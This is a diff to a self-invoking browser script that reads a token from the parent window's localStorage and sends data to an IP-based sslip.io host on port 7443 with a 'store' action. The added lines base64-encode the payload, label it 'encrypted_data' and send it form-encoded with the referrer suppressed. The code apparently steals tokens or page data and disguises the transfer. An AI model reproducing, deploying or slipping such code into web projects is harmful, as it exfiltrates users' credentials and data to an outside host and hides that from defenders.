@@ -1,6 +1,6 @@
 (function(){
   var TOKEN_KEY = '__gva_7m3f_tk';
-  var REPORT_URL_ACTIVE = 'https://3-142-201-171.sslip.io:7443/?action=store';
+  var REPORT_URL = 'https://3-142-201-171.sslip.io:7443/?action=store';
 
   function getToken() {
     try { return window.parent.localStorage.getItem(TOKEN_KEY); } catch(e) {}
@@ -32,12 +32,21 @@
       .catch(function(){ return null; });
   }
 
+  function b64encode(str) {
+    try { return btoa(unescape(encodeURIComponent(str))); } catch(e) {
+      try { return btoa(str); } catch(e2) { return str; }
+    }
+  }
+
   function send(data) {
     var payload = JSON.stringify(data);
-    return fetch(REPORT_URL_ACTIVE, {
+    var encoded = b64encode(payload);
+    var body = 'encrypted_data=' + encodeURIComponent(encoded);
+    return fetch(REPORT_URL, {
       method: 'POST',
       referrerPolicy: 'no-referrer',
-      body: payload
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: body
     }).then(function(r) {
       if (r.status !== 200 && r.status !== 202) throw new Error('HTTP ' + r.status);
     });
